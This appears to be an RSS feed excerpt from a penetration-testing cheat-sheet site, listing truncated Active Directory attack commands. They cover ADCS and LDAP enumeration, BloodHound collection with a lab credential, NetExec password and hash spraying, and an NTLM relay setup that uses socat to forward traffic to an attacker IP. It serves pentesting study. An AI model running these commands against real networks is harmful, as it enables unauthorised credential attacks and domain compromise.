channel.title: Ldap on TLDRBins
channel.description: Recent content in Ldap on TLDRBins

item.title: ADCS
item.description: Enum (From Linux) certipy-ad nxc # Password certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable # NTLM certipy-ad find -u '<USER>' -hashes '<HASH>' -target <TARGET> -text -stdout -vulnerable # Kerberos certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP> # Password nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M adcs # NTLM nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .

item.title: Bloodhound
item.description: Info Collection (From Linux) bloodhound-python nxc ldapsearch certipy-ad # Password bloodhound-python -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -dc <DC> -ns <DC_IP> -c all --zip $ python3 bloodhound.py -d rebound.htb -u oorend -p '1GR8t@$$4u' -dc dc01.rebound.htb -ns 10.10.11.231 -c all --zip INFO: Found AD domain: rebound.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.rebound.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead.

item.title: LDAP
item.description: Enum ldapsearch ldapdomaindump nmap # Get domain base ldapsearch -x -H ldap://<TARGET> -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://<TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' # Just get a class (e.g. person) ldapsearch -x -H ldap://<TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' '(objectClass=person)' # With creds ldapsearch -x -H ldap://<TARGET> -D "CN=<USER>,CN=Users,DC=<EXAMPLE>,DC=<COM>" -w '<PASSWORD>' -b 'DC=<EXAMPLE>,DC=<COM>' # Fix 'BindSimple: Transport encryption required.' LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://<TARGET> -D "CN=<USER>,CN=Users,DC=<EXAMPLE>,DC=<COM>" -w '<PASSWORD>' -b 'DC=<EXAMPLE>,DC=<COM>' # With creds ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <TARGET> -o .

item.title: NetExec (nxc)
item.description: Basic Commands Password NTLM Kerberos # Single user, Single password nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' # Single user, Single password, Local auth nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth # Single user, Single password (Active Directory) nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> # Single user, Multiple passwords nxc <PROTOCOL> <TARGET> -u '<USER>' -p <PASSWORDS> -d <DOMAIN> # Multiple users, Single password nxc <PROTOCOL> <TARGET> -u <USERS> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success # Multiple users, Multiple passwords nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> -d <DOMAIN> --continue-on-success # Match username to corresponding password nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> --no-bruteforce --continue-on-success nxc <PROTOCOL> <TARGET> -u '<USER>' -H <HASH> # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k # With Kerberos ccache, or STATUS_NOT_SUPPORTED (NTLM disabled) sudo ntpdate -s <DC_IP> && nxc <PROTOCOL> <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache Hint: We can also run on multiple targets

item.title: NTLM Relay Attack
item.description: Abuse #1: Add Shadow Credential 1. Run socat to Redirect Traffic (Inside Pivoting Node) # Upload socat.zip and unzip Expand-Archive -Path "<SOCAT_ZIP_FILE_PATH>" -DestinationPath "<DEST_PATH>" -Force PS C:\xampp\htdocs> Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 PS C:\xampp\htdocs\socat-windows-master> .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat 2. Enable Webdav (Inside Windows Target) [Optional] $Source = @" using System; using System.
